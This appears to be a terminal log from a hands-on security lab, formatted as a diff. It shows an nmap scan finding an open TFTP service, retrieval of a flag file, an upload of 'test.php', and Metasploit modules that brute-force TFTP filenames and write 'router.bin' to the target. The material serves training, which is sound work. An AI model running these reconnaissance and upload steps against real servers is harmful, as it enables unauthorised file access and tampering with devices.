@@ -1,0 +1,170 @@
+root@attackdefense:~# ip addr
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+1297: eth0@if1298: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default
+    link/ether 02:42:0a:01:01:05 brd ff:ff:ff:ff:ff:ff link-netnsid 0
+    inet 10.1.1.5/24 brd 10.1.1.255 scope global eth0
+       valid_lft forever preferred_lft forever
+1300: eth1@if1301: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default
+    link/ether 02:42:c0:e8:e7:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
+    inet 192.232.231.2/24 brd 192.232.231.255 scope global eth1
+       valid_lft forever preferred_lft forever
+root@attackdefense:~# ping 192.232.231.3
+PING 192.232.231.3 (192.232.231.3) 56(84) bytes of data.
+64 bytes from 192.232.231.3: icmp_seq=1 ttl=64 time=0.096 ms
+64 bytes from 192.232.231.3: icmp_seq=2 ttl=64 time=0.077 ms
+64 bytes from 192.232.231.3: icmp_seq=3 ttl=64 time=0.093 ms
+^C
+--- 192.232.231.3 ping statistics ---
+3 packets transmitted, 3 received, 0% packet loss, time 37ms
+rtt min/avg/max/mdev = 0.077/0.088/0.096/0.013 ms
+root@attackdefense:~# nmap -sV -sU -p 69 192.232.231.3
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-07 10:41 UTC
+Stats: 0:01:28 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
+Service scan Timing: About 0.00% done
+Nmap scan report for 2gmdcj37iqns178yd05f90pdc.temp-network_a-232-231 (192.232.231.3)
+Host is up (0.000040s latency).
+
+PORT   STATE         SERVICE VERSION
+69/udp open|filtered tftp
+MAC Address: 02:42:C0:E8:E7:03 (Unknown)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 99.34 seconds
+root@attackdefense:~# tftp
+tftp> connect 192.232.231.3
+tftp> status
+Connected to 192.232.231.3.
+Mode: netascii Verbose: off Tracing: off
+Rexmt-interval: 5 seconds, Max-timeout: 25 seconds
+tftp> trace
+Packet tracing on.
+tftp> get falg
+sent RRQ <file=falg, mode=netascii>
+received ERROR <code=1, msg=File not found>
+Error code 1: File not found
+tftp> get flag
+sent RRQ <file=flag, mode=netascii>
+received DATA <block=1, 34 bytes>
+Received 34 bytes in 0.0 seconds
+tftp> verbose
+Verbose mode on.
+tftp> put test.php
+putting test.php to 192.232.231.3:test.php [netascii]
+sent WRQ <file=test.php, mode=netascii>
+received ACK <block=0>
+sent DATA <block=1, 43 bytes>
+received ACK <block=1>
+Sent 43 bytes in 0.0 seconds [inf bits/sec]
+tftp> ^Z
+[3]+  Stopped                 tftp
+root@attackdefense:~# ^C
+root@attackdefense:~# cat flag
+00abf97c18836f3f91715696b9843540
+root@attackdefense:~#
+root@attackdefense:~#
+root@attackdefense:~# msfdb init
+Using /usr/local/rvm/gems/ruby-2.5.3
+[ ok ] Starting PostgreSQL 11 database server: main.
+A database appears to be already configured, skipping initialization
+root@attackdefense:~# service postgresql start
+[ ok ] Starting PostgreSQL 11 database server: main.
+root@attackdefense:~# msfconsole
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%     %%%         %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%  %%  %%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%  %  %%%%%%%%   %%%%%%%%%%% https://metasploit.com %%%%%%%%%%%%%%%%%%%%%%%%
+%%  %%  %%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%  %%%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%%  %%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%    %%   %%%%%%%%%%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%  %%%%%
+%%%%  %%  %%  %      %%      %%    %%%%%      %    %%%%  %%   %%%%%%       %%
+%%%%  %%  %%  %  %%% %%%%  %%%%  %%  %%%%  %%%%  %% %%  %% %%% %%  %%%  %%%%%
+%%%%  %%%%%%  %%   %%%%%%   %%%%  %%%  %%%%  %%    %%  %%% %%% %%   %%  %%%%%
+%%%%%%%%%%%% %%%%     %%%%%    %%  %%   %    %%  %%%%  %%%%   %%%   %%%     %
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%%%%% %%%%%%%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%          %%%%%%%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+
+       =[ metasploit v5.0.0-dev-64c629e75a                ]
++ -- --=[ 1837 exploits - 1038 auxiliary - 319 post       ]
++ -- --=[ 541 payloads - 44 encoders - 10 nops            ]
++ -- --=[ 2 evasion                                       ]
++ -- --=[ ** This is Metasploit 5 development branch **   ]
+
+msf5 > use auxiliary/scanner/tftp/
+use auxiliary/scanner/tftp/ipswitch_whatsupgold_tftp  use auxiliary/scanner/tftp/netdecision_tftp           use auxiliary/scanner/tftp/tftpbrute
+msf5 > use auxiliary/scanner/tftp/tftpbrute
+msf5 auxiliary(scanner/tftp/tftpbrute) > show options
+
+Module options (auxiliary/scanner/tftp/tftpbrute):
+
+   Name        Current Setting                                          Required  Description
+   ----        ---------------                                          --------  -----------
+   CHOST                                                                no        The local client address
+   DICTIONARY  /usr/share/metasploit-framework/data/wordlists/tftp.txt  yes       The list of filenames
+   RHOSTS                                                               yes       The target address range or CIDR identifier
+   RPORT       69                                                       yes       The target port
+   THREADS     1                                                        yes       The number of concurrent threads
+
+msf5 auxiliary(scanner/tftp/tftpbrute) > set RHOSTS 192.232.231.3
+RHOSTS => 192.232.231.3
+msf5 auxiliary(scanner/tftp/tftpbrute) >
+msf5 auxiliary(scanner/tftp/tftpbrute) > set RHOSTS 192.232.231.3
+RHOSTS => 192.232.231.3
+msf5 auxiliary(scanner/tftp/tftpbrute) > run
+
+[+] Found 46xxupgrade.scr on 192.232.231.3
+[+] Found boot.bin on 192.232.231.3
+[+] Found default.cfg on 192.232.231.3
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf5 auxiliary(scanner/tftp/tftpbrute) >
+msf5 > use auxiliary/admin/tftp/tftp_transfer_util
+msf5 auxiliary(admin/tftp/tftp_transfer_util) > show options
+
+Module options (auxiliary/admin/tftp/tftp_transfer_util):
+
+   Name             Current Setting  Required  Description
+   ----             ---------------  --------  -----------
+   FILEDATA                          no        Data to upload in lieu of a real local file.
+   FILENAME                          no        The local filename
+   LHOST                             no        The local address the TFTP client should bind to
+   LPORT                             no        The local port the TFTP client should listen on (default is random)
+   MODE             octet            no        The TFTP mode; usual choices are netascii and octet.
+   REMOTE_FILENAME                   no        The remote filename
+   RHOST                             yes       The remote TFTP server
+   RPORT            69               yes       The target port
+
+
+Auxiliary action:
+
+   Name    Description
+   ----    -----------
+   Upload  Upload FILENAME as REMOTE_FILENAME to the server.
+
+
+msf5 auxiliary(admin/tftp/tftp_transfer_util) > set RHOST 192.232.231.3
+RHOST => 192.232.231.3
+msf5 auxiliary(admin/tftp/tftp_transfer_util) > set FILEDATA router.bin
+FILEDATA => router.bin
+msf5 auxiliary(admin/tftp/tftp_transfer_util) > set FILENAME router.bin
+FILENAME => router.bin
+msf5 auxiliary(admin/tftp/tftp_transfer_util) > set REMOTE_FILENAME router.bin
+REMOTE_FILENAME => router.bin
+msf5 auxiliary(admin/tftp/tftp_transfer_util) > run
+
+[*] Sending 'DATA:router.bin' to 192.232.231.3:69 as 'router.bin'
+[+] 192.232.231.3:69 WRQ accepted, sending the file.
+[+] 192.232.231.3:69 Sending 10 bytes (1 blocks)
+[+] 192.232.231.3:69 Transferred 10 bytes in 1 blocks, upload complete!
+[*] 192.232.231.3:69 TFTP transfer operation complete.
+[*] Auxiliary module execution completed
+msf5 auxiliary(admin/tftp/tftp_transfer_util) >
+
+
